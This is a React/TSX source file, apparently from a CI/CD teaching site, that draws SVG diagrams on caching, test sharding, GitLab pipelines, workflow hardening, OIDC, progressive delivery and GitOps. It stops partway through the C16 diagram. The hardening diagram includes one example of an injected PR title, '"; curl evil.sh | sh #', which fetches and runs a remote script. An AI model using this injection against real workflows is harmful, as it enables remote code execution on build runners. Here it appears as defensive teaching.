        <Pill x={648} y={102} w={192} h={94} label="PR Branch: cancel: true" sub="Push c1, c2, c3 -> Cancels c1 & c2, runs ONLY latest c3!" tone="sky" p={p} />
        <Pill x={648} y={214} w={192} h={102} label="Prod Deploy: cancel: false" sub="Queues runs sequentially! Never aborts mid-migration!" tone="emerald" p={p} />

        <path d="M 505 166 L 505 186" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C07: Dependency Cache (hashFiles('**/package-lock.json') Cross-Run) vs Build Artifacts (upload -> download Cross-Job)
const C07Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c07" isLight={isLight} className={className} title="Dependency Cache (Cross-Run Lockfile Hash) vs Build Artifacts (Cross-Job)" tag="cicd:c07">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="402" h="300" tone="cyan" p={p} title="DEPENDENCY CACHE (actions/cache@v4)" badge="Cross-Workflow Runs" />
        <CalloutBadge x={44} y={58} num={1} tone="cyan" p={p} />
        <Pill x={42} y={100} w={366} h={48} label="Key: runner.os-npm-hashFiles('**/package-lock.json')" sub="Deterministic SHA-256 fingerprint of exact dependency tree" tone="cyan" p={p} />
        <Pill x={42} y={162} w={176} h={64} label="main Branch (Writer)" sub="pull-push ~/.npm cache" tone="emerald" p={p} />
        <Pill x={232} y={162} w={176} h={64} label="PR Branches (Readers)" sub="Read-only hit in ~3s!" tone="sky" p={p} />
        <Pill x={42} y={242} w={366} h={54} label="Best-Effort Storage (10 GB Repo Cap / 7d TTL)" sub="If evicted -> Pipeline slower, NEVER breaks correctness" tone="slate" p={p} />
        <text x="225" y="328" textAnchor="middle" fill={p.tones.cyan.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Cache ~/.npm store (NOT raw OS-specific node_modules)
        </text>

        <path d="M 130 148 L 130 160" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
        <path d="M 218 194 L 230 194" fill="none" stroke={p.tones.sky.stroke} strokeWidth="1.8" markerEnd={marker('sky')} />

        <BoxCard x="452" y="58" w="404" h="300" tone="violet" p={p} title="BUILD ARTIFACTS (v4)" badge="Build Once, Deploy Many" />
        <CalloutBadge x={472} y={58} num={2} tone="violet" p={p} />
        <Pill x={470} y={100} w={174} h={62} label="Job: build (VM #1)" sub="npm run build -> dist/" tone="violet" p={p} />
        <Pill x={664} y={100} w={174} h={62} label="upload-artifact@v4" sub="name: web-dist (7d TTL)" tone="amber" p={p} />
        <Pill x={470} y={186} w={368} h={56} label="Job: deploy-staging & deploy-prod (VM #2, #3)" sub="download-artifact@v4 -> Identical immutable bundle!" tone="emerald" p={p} />
        <CalloutBadge x={838} y={214} num={3} tone="emerald" p={p} />
        <Pill x={470} y={258} w={368} h={52} label="Also Stores: Playwright Traces, Coverage, SBOM" sub="Guaranteed 100% commit-exact binary integrity" tone="sky" p={p} />
        <text x="654" y="332" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          retention-days: 7 cuts storage cost by 90%
        </text>

        <path d="M 644 131 L 662 131" fill="none" stroke={p.tones.amber.stroke} strokeWidth="1.8" markerEnd={marker('amber')} />
        <path d="M 751 162 L 654 184" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C08: Sub-5-Minute Pipeline Optimization: Test Sharding (1/4..4/4), BuildKit Layer Cache & Critical Path Compression
const C08Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c08" isLight={isLight} className={className} title="Critical Path Compression (42m -> 5m): Sharding & Buildx GHA Cache" tag="cicd:c08">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="56" w="832" h="82" tone="rose" p={p} title="BEFORE: SERIAL BOTTLENECK (42 MINUTES WALL-CLOCK)" badge="Slow Feedback" />
        <Pill x={40} y={92} w={132} h={34} label="npm install (4m)" tone="rose" p={p} />
        <Pill x={184} y={92} w={140} h={34} label="lint + tsc (5m)" tone="amber" p={p} />
        <Pill x={336} y={92} w={164} h={34} label="docker no-cache (9m)" tone="rose" p={p} />
        <Pill x={512} y={92} w={128} h={34} label="sleep 45 (Flaky)" tone="amber" p={p} />
        <Pill x={652} y={92} w={188} h={34} label="Playwright 400 E2E (16m)" tone="rose" p={p} />

        <BoxCard x="24" y="152" w="832" h="206" tone="emerald" p={p} title="AFTER: PARALLEL CRITICAL PATH = max(2m, 2m, 4m) + 1m = 5 MINUTES!" badge="8x Faster" />
        <CalloutBadge x={44} y={152} num={1} tone="emerald" p={p} />

        <Pill x={42} y={194} w={172} h={42} label="lint + tsc (2m)" sub="npm ci + setup-node cache" tone="sky" p={p} />
        <Pill x={42} y={246} w={172} h={46} label="Buildx (type=gha,mode=max)" sub="8m -> 1.8m layer cache!" tone="cyan" p={p} />
        <Pill x={42} y={302} w={172} h={42} label="Poll /healthz (No sleep!)" sub="Ready in 1.4s deterministic" tone="emerald" p={p} />

        <BoxCard x="242" y="190" w="368" h="154" tone="violet" p={p} title="PLAYWRIGHT E2E SHARDING (16m / 4 = 4m)" badge="--shard=i/4" />
        <CalloutBadge x={262} y={190} num={2} tone="violet" p={p} />
        <Pill x={258} y={228} w={160} h={46} label="Shard 1/4 (100 tests)" sub="4.0 min VM #1" tone="violet" p={p} />
        <Pill x={432} y={228} w={160} h={46} label="Shard 2/4 (100 tests)" sub="3.9 min VM #2" tone="violet" p={p} />
        <Pill x={258} y={284} w={160} h={46} label="Shard 3/4 (100 tests)" sub="4.1 min VM #3" tone="violet" p={p} />
        <Pill x={432} y={284} w={160} h={46} label="Shard 4/4 (100 tests)" sub="3.8 min VM #4" tone="violet" p={p} />

        <BoxCard x="640" y="190" w="198" h="154" tone="emerald" p={p} title="AGGREGATOR GATE" badge="1 Rule!" />
        <CalloutBadge x={660} y={190} num={3} tone="emerald" p={p} />
        <Pill x={656} y={230} w={166} h={54} label="Job: ci-gate (if: always())" sub="Checks needs.*.result" tone="emerald" p={p} />
        <text x="739" y="308" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Single Required Status
        </text>
        <text x="739" y="324" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          in Branch Protection!
        </text>

        <path d="M 214 215 L 638 250" fill="none" stroke={p.tones.sky.stroke} strokeWidth="1.6" markerEnd={marker('sky')} />
        <path d="M 610 267 L 638 267" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C09: .gitlab-ci.yml Architecture (stages, rules, needs DAG, artifacts:reports & Shared/Kubernetes Runners)
const C09Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c09" isLight={isLight} className={className} title="GitLab CI/CD Architecture (.gitlab-ci.yml): Container-Native Stages & DAG" tag="cicd:c09">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="252" h="300" tone="amber" p={p} title="CONTAINER-FIRST DEFAULT" badge=".gitlab-ci.yml" />
        <CalloutBadge x={44} y={58} num={1} tone="amber" p={p} />
        <Pill x={40} y={100} w={220} h={48} label="default: image: node:22-alpine" sub="Every Job boots in Docker/K8s Pod" tone="amber" p={p} />
        <Pill x={40} y={160} w={220} h={52} label="workflow.rules (No Duplicates)" sub="MR pipeline vs Branch pipeline" tone="violet" p={p} />
        <Pill x={40} y={224} w={220} h={52} label="K8s / Docker Runner Executor" sub="Auto-scales Pods on internal cluster" tone="sky" p={p} />
        <text x="150" y="308" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          NEVER mix rules: with legacy only:
        </text>
        <text x="150" y="326" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          parallel: 4 shards tests in 1 line!
        </text>

        <BoxCard x="298" y="58" w="314" h="300" tone="sky" p={p} title="STAGES + DAG BYPASS (needs:)" badge="Hybrid Graph" />
        <CalloutBadge x={318} y={58} num={2} tone="sky" p={p} />
        <Pill x={316} y={100} w={278} h={46} label="Stage 1: install (cache: pull-push)" sub="Populates .npm/ keyed by package-lock.json" tone="cyan" p={p} />
        <Pill x={316} y={160} w={132} h={52} label="Stage 2: lint" sub="needs: [] (0s!)" tone="emerald" p={p} />
        <Pill x={462} y={160} w={132} h={52} label="Stage 2: test" sub="parallel: 4" tone="violet" p={p} />
        <Pill x={316} y={226} w={278} h={50} label="Stage 3: build -> Stage 4: deploy" sub="needs: [lint, test] bypasses slow stages" tone="sky" p={p} />
        <text x="455" y="308" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          needs: [] starts at t=0s without waiting!
        </text>

        <BoxCard x="634" y="58" w="222" h="300" tone="emerald" p={p} title="NATIVE ARTIFACTS" badge="Auto-Download" />
        <CalloutBadge x={654} y={58} num={3} tone="emerald" p={p} />
        <Pill x={650} y={102} w={190} h={58} label="artifacts: paths: [dist/]" sub="expire_in: 7 days" tone="emerald" p={p} />
        <Pill x={650} y={176} w={190} h={62} label="artifacts:reports:junit" sub="Renders inline MR Test UI!" tone="sky" p={p} />
        <Pill x={650} y={254} w={190} h={64} label="Downstream Stage Auto-Pull" sub="Zero download plugin needed" tone="cyan" p={p} />

        <path d="M 260 124 L 314 124" fill="none" stroke={p.tones.cyan.stroke} strokeWidth="1.8" markerEnd={marker('cyan')} />
        <path d="M 455 146 L 528 158" fill="none" stroke={p.tones.violet.stroke} strokeWidth="1.8" markerEnd={marker('violet')} />
        <path d="M 594 251 L 648 131" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C10: GitHub Actions Supply-Chain Hardening: permissions: contents: read, 40-char Commit SHA Pinning & Script Injection Defense
const C10Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c10" isLight={isLight} className={className} title="Zero-Trust Workflow Hardening: Least-Privilege, Anti-Injection & SHA-40" tag="cicd:c10">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="262" h="300" tone="sky" p={p} title="1. TOKEN & FORK ISOLATION" badge="Anti-Pwn-Request" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={40} y={102} w={230} h={54} label="permissions: contents: read" sub="Revokes default write-all token!" tone="emerald" p={p} />
        <Pill x={40} y={170} w={230} h={58} label="on: pull_request (Safe Fork)" sub="Read-only token + No Secrets" tone="sky" p={p} />
        <Pill x={40} y={242} w={230} h={64} label="DANGER: pull_request_target" sub="NEVER checkout untrusted PR ref!" tone="rose" p={p} />
        <text x="155" y="330" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9" fontWeight="700">
          Stops Fork RCE &amp; Secret Exfiltration
        </text>

        <BoxCard x="308" y="58" w="268" h="300" tone="amber" p={p} title="2. SCRIPT INJECTION SHIELD" badge="Shell Sanitization" />
        <CalloutBadge x={328} y={58} num={2} tone="amber" p={p} />
        <Pill x={324} y={102} w={236} h={64} label='VULNERABLE Inline ${{ ... }}:' sub='echo "${{ github.event.pull_request.title }}"' tone="rose" p={p} />
        <text x="442" y="182" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9">
          PR Title: &quot;; curl evil.sh | sh # -&gt; RCE!
        </text>
        <Pill x={324} y={198} w={236} h={72} label='SAFE Intermediate env: Variable:' sub='env: PR_TITLE: ${{ ... }} -> echo "$PR_TITLE"' tone="emerald" p={p} />
        <text x="442" y="294" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Bash reads literal data — Zero eval!
        </text>
        <text x="442" y="314" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Applies to PR title, body, branch name
        </text>

        <BoxCard x="598" y="58" w="258" h="300" tone="emerald" p={p} title="3. 40-CHAR SHA PINNING" badge="Supply Chain" />
        <CalloutBadge x={618} y={58} num={3} tone="emerald" p={p} />
        <Pill x={614} y={102} w={226} h={54} label="MUTABLE: vendor/action@v4" sub="Hijacked tag can move to malware!" tone="rose" p={p} />
        <Pill x={614} y={172} w={226} h={66} label="IMMUTABLE: @a5ac7e51b4... (40 hex)" sub="Cryptographic Git SHA-1 lock # v4.2.0" tone="emerald" p={p} />
        <Pill x={614} y={252} w={226} h={54} label="Dependabot / Renovate Updates" sub="Auto-PRs verified SHA bumps weekly" tone="cyan" p={p} />
        <text x="727" y="330" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Defeats tj-actions style tag hijacks!
        </text>

        <path d="M 442 166 L 442 196" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
        <path d="M 727 156 L 727 170" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C11: 5-Layer DevSecOps Shift-Left Shields: Secret Scan -> SCA/SBOM -> SAST -> Container Image Trivy -> DAST + Cosign Signing
const C11Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c11" isLight={isLight} className={className} title="5-Layer Shift-Left DevSecOps Shields & Supply-Chain SBOM/Signing" tag="cicd:c11">
    {(p, marker) => (
      <>
        <BoxCard x="20" y="58" w="840" h="172" tone="sky" p={p} title="SWISS-CHEESE 5-LAYER AUTOMATED SECURITY PIPELINE (<4 MINUTES)" badge="Shift-Left Gate" />
        <CalloutBadge x={40} y={58} num={1} tone="amber" p={p} />

        <Pill x={34} y={104} w={144} h={98} label="L1: Secret Scan" sub="Gitleaks (depth:0)" tone="amber" p={p} />
        <Pill x={198} y={104} w={144} h={98} label="L2: SAST Code" sub="Semgrep / CodeQL" tone="sky" p={p} />
        <Pill x={362} y={104} w={148} h={98} label="L3: SCA Deps" sub="npm audit --omit=dev" tone="violet" p={p} />
        <CalloutBadge x={510} y={104} num={2} tone="rose" p={p} />
        <Pill x={530} y={104} w={150} h={98} label="L4: Image CVE" sub="Trivy CRITICAL=exit 1" tone="rose" p={p} />
        <CalloutBadge x={680} y={104} num={3} tone="emerald" p={p} />
        <Pill x={700} y={104} w={144} h={98} label="L5: SBOM + Sign" sub="CycloneDX + Cosign" tone="emerald" p={p} />

        <path d="M 178 153 L 196 153" fill="none" stroke={p.tones.sky.stroke} strokeWidth="2" markerEnd={marker('sky')} />
        <path d="M 342 153 L 360 153" fill="none" stroke={p.tones.violet.stroke} strokeWidth="2" markerEnd={marker('violet')} />
        <path d="M 510 153 L 528 153" fill="none" stroke={p.tones.rose.stroke} strokeWidth="2" markerEnd={marker('rose')} />
        <path d="M 680 153 L 698 153" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />

        <BoxCard x="20" y="246" w="408" h="112" tone="rose" p={p} title="ROOTLESS BUILD (NO DOCKER.SOCK!)" badge="Zero Daemon Root" />
        <Pill x={36} y={284} w={376} h={56} label="BuildKit Rootless / Kaniko vs /var/run/docker.sock" sub="Mounting host docker.sock == Instant Host Root Escalation!" tone="rose" p={p} />

        <BoxCard x="452" y="246" w="408" h="112" tone="emerald" p={p} title="POST-DEPLOY DAST + ZERO-DAY RESPONSE" badge="Runtime Verify" />
        <Pill x={468} y={284} w={376} h={56} label="OWASP ZAP DAST (Staging) + Indexed SBOM JSON" sub="Query affected services in 5s when Log4j/OpenSSL CVE drops" tone="emerald" p={p} />
      </>
    )}
  </SvgShell>
);

// C12: Keyless Cloud Auth via OIDC: GitHub OIDC Provider JWT (sub claim) -> AWS STS / GCP WIF Short-Lived Token
const C12Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c12" isLight={isLight} className={className} title="Keyless Cloud Auth (OIDC JWT -> AWS STS / GCP WIF Short-Lived Token)" tag="cicd:c12">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="256" h="300" tone="sky" p={p} title="GITHUB ACTIONS RUNNER" badge="Zero Static Keys" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={40} y={102} w={224} h={52} label="permissions: id-token: write" sub="Enables OIDC token request API" tone="sky" p={p} />
        <Pill x={40} y={170} w={224} h={62} label="GitHub OIDC Provider" sub="token.actions.githubusercontent.com" tone="violet" p={p} />
        <Pill x={40} y={248} w={224} h={64} label="NO AWS_SECRET_ACCESS_KEY!" sub="Nothing stored in GitHub Secrets" tone="emerald" p={p} />
        <text x="152" y="334" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Eliminates 90-day key rotation toil
        </text>

        <BoxCard x="308" y="58" w="268" h="300" tone="violet" p={p} title="SIGNED OIDC JWT CLAIMS" badge="RSA/ECDSA Sig" />
        <CalloutBadge x={328} y={58} num={2} tone="violet" p={p} />
        <Pill x={324} y={102} w={236} h={46} label="iss: token.actions.github..." sub="Verified via public JWKS keys" tone="violet" p={p} />
        <Pill x={324} y={158} w={236} h={46} label="aud: sts.amazonaws.com" sub="Recipient cloud audience lock" tone="cyan" p={p} />
        <Pill x={324} y={214} w={236} h={56} label="sub: repo:acme/api:ref:refs/heads/main" sub="Exact Org + Repo + Branch identity!" tone="amber" p={p} />
        <text x="442" y="296" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          TRAP: Never write sub: repo:*!
        </text>
        <text x="442" y="314" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Wildcard lets any GitHub user assume role!
        </text>

        <BoxCard x="604" y="58" w="252" h="300" tone="emerald" p={p} title="CLOUD IAM STS / GCP WIF" badge="TTL <= 60m" />
        <CalloutBadge x={624} y={58} num={3} tone="emerald" p={p} />
        <Pill x={620} y={102} w={220} h={58} label="AWS STS Trust Policy Check" sub="AssumeRoleWithWebIdentity" tone="amber" p={p} />
        <Pill x={620} y={176} w={220} h={58} label="Ephemeral Credentials (15-60m)" sub="Auto-expires right after Job!" tone="emerald" p={p} />
        <Pill x={620} y={250} w={220} h={62} label="SLSA Build Provenance" sub="attest-build-provenance@v1" tone="sky" p={p} />
        <text x="730" y="334" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Cryptographic proof of build origin
        </text>

        <path d="M 152 154 L 152 168" fill="none" stroke={p.tones.violet.stroke} strokeWidth="1.8" markerEnd={marker('violet')} />
        <path d="M 264 201 L 322 201" fill="none" stroke={p.tones.violet.stroke} strokeWidth="2" markerEnd={marker('violet')} />
        <path d="M 560 201 L 618 131" fill="none" stroke={p.tones.amber.stroke} strokeWidth="2" markerEnd={marker('amber')} />
        <path d="M 730 160 L 730 174" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C13: Protected environment: production Approval Gate, CODEOWNERS Enforcement & Automated PR Review Checks
const C13Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c13" isLight={isLight} className={className} title="Release Governance: CODEOWNERS, Low-Noise AI Review & Protected Environments" tag="cicd:c13">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="262" h="300" tone="sky" p={p} title="1. CODEOWNERS + RULESETS" badge="PR Path Gate" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={40} y={102} w={230} h={46} label="*  @acme/core-devs" sub="Default fallback owner" align="left" tone="slate" p={p} />
        <Pill x={40} y={158} w={230} h={48} label="/.github/  @acme/secops" sub="Protects CI YAML!" align="left" tone="amber" p={p} />
        <Pill x={40} y={216} w={230} h={48} label="/db/migrations/  @acme/dba" sub="Last Match Wins rule!" align="left" tone="sky" p={p} />
        <Pill x={40} y={274} w={230} h={58} label="Branch Ruleset Required!" sub="Enforces Code Owner sign-off" tone="emerald" p={p} />

        <BoxCard x="308" y="58" w="260" h="300" tone="violet" p={p} title="2. LOW-NOISE AI PR GATE" badge="Safe Context" />
        <CalloutBadge x={328} y={58} num={2} tone="violet" p={p} />
        <Pill x={324} y={102} w={228} h={54} label="path_filters: !package-lock.json" sub="Skips generated dist/ & lockfiles" tone="violet" p={p} />
        <Pill x={324} y={168} w={228} h={56} label="Scoped Path Instructions" sub="src/auth/** -> Check JWT/SQLi" tone="cyan" p={p} />
        <Pill x={324} y={236} w={228} h={64} label="Fork Guard (Protect API Key)" sub="on: pull_request + skip forks!" tone="amber" p={p} />
        <text x="438" y="326" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          High-signal logic review in &lt;45s
        </text>

        <BoxCard x="590" y="58" w="266" h="300" tone="emerald" p={p} title="3. ENVIRONMENT: PRODUCTION" badge="Manual Gate" />
        <CalloutBadge x={610} y={58} num={3} tone="emerald" p={p} />
        <Pill x={606} y={102} w={234} h={52} label="Deployment Branch: main only" sub="Blocks feature branches cold!" tone="sky" p={p} />
        <Pill x={606} y={166} w={234} h={56} label="Required Reviewers Approval" sub="Pauses job + Audit Log trail" tone="amber" p={p} />
        <Pill x={606} y={234} w={234} h={64} label="Environment-Scoped Secrets" sub="PROD_ROLE_ARN unlocked ONLY post-approval" tone="emerald" p={p} />
        <text x="723" y="326" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Strict Staging != Prod wall
        </text>

        <path d="M 286 208 L 306 208" fill="none" stroke={p.tones.violet.stroke} strokeWidth="2" markerEnd={marker('violet')} />
        <path d="M 568 208 L 588 208" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C14: Progressive Delivery: Blue-Green Instant Switch vs Canary (5% -> 25% -> 100%) with Error-Rate Auto-Rollback
const C14Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c14" isLight={isLight} className={className} title="Progressive Delivery: Blue-Green Cutover vs Canary & Auto-Rollback" tag="cicd:c14">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="336" h="300" tone="cyan" p={p} title="BLUE-GREEN INSTANT SWITCH" badge="~2x Infra Cost" />
        <CalloutBadge x={44} y={58} num={1} tone="cyan" p={p} />
        <Pill x={42} y={102} w={298} h={46} label="Immutable Image Tag: sha-9f2d41c" sub="NEVER overwrite mutable :latest in Prod!" tone="sky" p={p} />
        <Pill x={42} y={162} w={142} h={68} label="BLUE Stack (v1.4)" sub="100% -> 0% Active" tone="sky" p={p} />
        <Pill x={198} y={162} w={142} h={68} label="GREEN Stack (v1.5)" sub="Preview -> 100% Live!" tone="emerald" p={p} />
        <Pill x={42} y={246} w={298} h={56} label="Service Selector Flip (<1s Cutover)" sub="Instant rollback by flipping selector back to Blue" tone="cyan" p={p} />
        <text x="191" y="330" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          QA tests previewService before public cutover
        </text>

        <BoxCard x="384" y="58" w="472" h="300" tone="emerald" p={p} title="CANARY PROGRESSIVE TRAFFIC (ARGO ROLLOUTS)" badge="Blast-Radius Cap" />
        <CalloutBadge x={404} y={58} num={2} tone="emerald" p={p} />

        <Pill x={402} y={104} w={132} h={58} label="Step 1: 5% Canary" sub="Pause 5m & Observe" tone="sky" p={p} />
        <Pill x={554} y={104} w={132} h={58} label="Step 2: 25% Canary" sub="Pause 10m & Observe" tone="cyan" p={p} />
        <Pill x={706} y={104} w={132} h={58} label="Step 3: 100% Promote" sub="New Stable Revision!" tone="emerald" p={p} />

        <BoxCard x="402" y="184" w="436" h="152" tone="rose" p={p} title="AUTOMATED PROMETHEUS ANALYSIS & ROLLBACK" badge="Zero-Human Delay" />
        <CalloutBadge x={422} y={184} num={3} tone="rose" p={p} />
        <Pill x={418} y={224} w={200} h={54} label="Metric: HTTP 5xx & p99" sub="Threshold: error_rate < 1%" tone="amber" p={p} />
        <Pill x={632} y={224} w={190} h={54} label="5xx Spikes > 1%!" sub="Auto-Abort -> 0% Canary!" tone="rose" p={p} />
        <text x="620" y="304" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          95% of customers never saw the buggy release!
        </text>
        <text x="620" y="322" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Heals in &lt;30s at 3 AM without paging human engineer
        </text>

        <path d="M 534 133 L 552 133" fill="none" stroke={p.tones.cyan.stroke} strokeWidth="2" markerEnd={marker('cyan')} />
        <path d="M 686 133 L 704 133" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
        <path d="M 468 162 L 468 182" fill="none" stroke={p.tones.amber.stroke} strokeWidth="1.8" markerEnd={marker('amber')} />
        <path d="M 618 251 L 630 251" fill="none" stroke={p.tones.rose.stroke} strokeWidth="1.8" markerEnd={marker('rose')} />
      </>
    )}
  </SvgShell>
);

// C15: Push CI vs Pull GitOps: ArgoCD Reconciliation Loop Watching Git Repo -> Drift Detection -> Self-Heal Sync to K8s
const C15Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c15" isLight={isLight} className={className} title="Pull-Based GitOps Architecture: CI App Repo, GitOps Repo & ArgoCD Sync" tag="cicd:c15">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="240" h="300" tone="sky" p={p} title="CI PIPELINE (APP REPO)" badge="No KUBECONFIG!" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={40} y={102} w={208} h={52} label="1. Test & Build Image" sub="shop-api:sha-7a2c91f" tone="sky" p={p} />
        <Pill x={40} y={168} w={208} h={52} label="2. Push to GHCR / ECR" sub="Immutable signed OCI image" tone="cyan" p={p} />
        <Pill x={40} y={234} w={208} h={64} label="3. Commit Tag to Config Repo" sub="Updates values-prod.yaml only!" tone="violet" p={p} />
        <text x="144" y="326" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Zero cluster admin keys in CI!
        </text>

        <BoxCard x="292" y="58" w="226" h="300" tone="violet" p={p} title="GITOPS CONFIG REPO" badge="Source of Truth" />
        <CalloutBadge x={312} y={58} num={2} tone="violet" p={p} />
        <Pill x={308} y={104} w={194} h={64} label="shop-gitops/envs/prod" sub="Declarative Helm / Kustomize" tone="violet" p={p} />
        <Pill x={308} y={184} w={194} h={58} label="Full Git Audit Trail" sub="git blame = Who, When, Why" tone="amber" p={p} />
        <Pill x={308} y={258} w={194} h={58} label="Rollback == git revert!" sub="Triggers clean sync in seconds" tone="emerald" p={p} />
        <text x="405" y="336" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Separate repo prevents CI loops
        </text>

        <BoxCard x="546" y="58" w="310" h="300" tone="emerald" p={p} title="PRIVATE K8S CLUSTER (ARGOCD)" badge="Outbound Pull" />
        <CalloutBadge x={566} y={58} num={3} tone="emerald" p={p} />
        <Pill x={564} y={102} w={274} h={54} label="ArgoCD Controller (Inside Cluster)" sub="Pulls Git over HTTPS — 0 Inbound Firewall!" tone="emerald" p={p} />
        <Pill x={564} y={170} w={274} h={56} label="Drift Detector (Git != Live State)" sub="Manual kubectl edit -> Flags OutOfSync!" tone="amber" p={p} />
        <Pill x={564} y={240} w={274} h={60} label="automated: { prune: true, selfHeal: true }" sub="Overwrites manual drift back to Git truth!" tone="cyan" p={p} />
        <text x="701" y="328" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          24/7 Autonomous Cluster Reconciliation
        </text>

        <path d="M 248 266 L 306 136" fill="none" stroke={p.tones.violet.stroke} strokeWidth="2" markerEnd={marker('violet')} />
        <path d="M 564 129 L 504 129" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
        <path d="M 701 156 L 701 168" fill="none" stroke={p.tones.amber.stroke} strokeWidth="1.8" markerEnd={marker('amber')} />
        <path d="M 701 226 L 701 238" fill="none" stroke={p.tones.cyan.stroke} strokeWidth="1.8" markerEnd={marker('cyan')} />
      </>
    )}
  </SvgShell>
);

// C16: Expand-and-Contract Zero-Downtime DB Migration + Monorepo Path-Filter Affected Graph + 4 DORA Metrics
const C16Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c16" isLight={isLight} className={className} title="Scale Architecture: Expand-Contract SQL, Monorepo Affected Graph & DORA" tag="cicd:c16">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="276" h="300" tone="sky" p={p} title="EXPAND-CONTRACT DB MIGRATION" badge="Zero-Downtime SQL" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={40} y={100} w={244} h={52} label="Phase 1: Expand (Nullable Col)" sub="ADD COLUMN display_name + Dual-Write" tone="emerald" p={p} />
        <Pill x={40} y={164} w={244} h={52} label="Phase 2: Backfill + Switch Read" sub="Batch update rows -> v2 reads new col" tone="sky" p={p} />
        <Pill x={40} y={228} w={244} h={52} label="Phase 3: Contract (Drop Legacy)" sub="Safe DROP COLUMN after v1 retired" tone="violet" p={p} />
        <text x="162" y="308" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Direct RENAME breaks live v1 Pods!
        </text>
        <text x="162" y="326" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          deploy-app MUST set needs: [migrate]
        </text>

        <BoxCard x="318" y="58" w="268" h="300" tone="violet" p={p} title="MONOREPO AFFECTED GRAPH" badge="Turborepo / Nx" />
        <CalloutBadge x={338} y={58} num={2} tone="violet" p={p} />
